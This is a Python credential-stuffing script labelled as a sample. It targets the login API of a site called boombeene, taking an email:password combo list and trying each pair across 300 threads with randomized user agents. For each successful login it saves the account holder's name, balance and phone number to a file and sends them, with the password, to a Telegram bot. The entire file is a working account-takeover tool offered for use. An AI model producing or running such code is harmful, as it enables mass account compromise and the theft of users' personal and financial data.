# this is a sample!
import requests
import threading
from colorama import Fore
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

ua = UserAgent()

token = input('Enter Token : ')
chat_id = input('Enter Id : ')

h, bad, total_checked = 0, 0, 0
lock = threading.Lock()

session = requests.Session()
session.headers.update({
    'accept': 'application/json, text/plain, */*',
    'content-type': 'application/json',
    'referer': 'https://members.boombeene.com/',
})

def tiger_coder(email, password):
    global h, bad, total_checked
    headers = {'user-agent': ua.random}
    json_data = {'email': email, 'password': password}
    try:
        r = session.post('https://api.boombeene.com/api/auth/login',
                         headers=headers, json=json_data, timeout=3)
        result = r.json()
    except:
        return

    with lock:
        total_checked += 1
        if "access_token" in result:
            h += 1
            full_name = result['user']['full_name']
            balance = result['user']['account_balance']
            phone = result['user']['phone_no']
            print(f"{Fore.GREEN}[HIT] {email}:{password} | {full_name} | {balance} | {phone}")
            with open("boombeene-Hits.txt", "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n{full_name}\n{balance}\n{phone}\n")
            requests.get(
                f"https://api.telegram.org/bot{token}/sendMessage",
                params={"chat_id": chat_id, "text": f"- New Hit\n- Email : {email} \n- Password : {password}\n- Full Name : {full_name}\n- Balance : {balance}\n- Phone : {phone}"}
            )
        else:
            bad += 1

        print(f"{Fore.CYAN}Check({total_checked})-({h})-({bad})", end="\r")

def load_combo(file_path):
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        return [line.strip().split(':', 1) for line in file if ':' in line]

combo_file = input("Put Combo : ")
combos = load_combo(combo_file)

with ThreadPoolExecutor(max_workers=300) as executor:
    executor.map(lambda c: tiger_coder(c[0], c[1]), combos)

print(f"\n{Fore.BLUE}Done! Hits: {h} | Bad: {bad}")
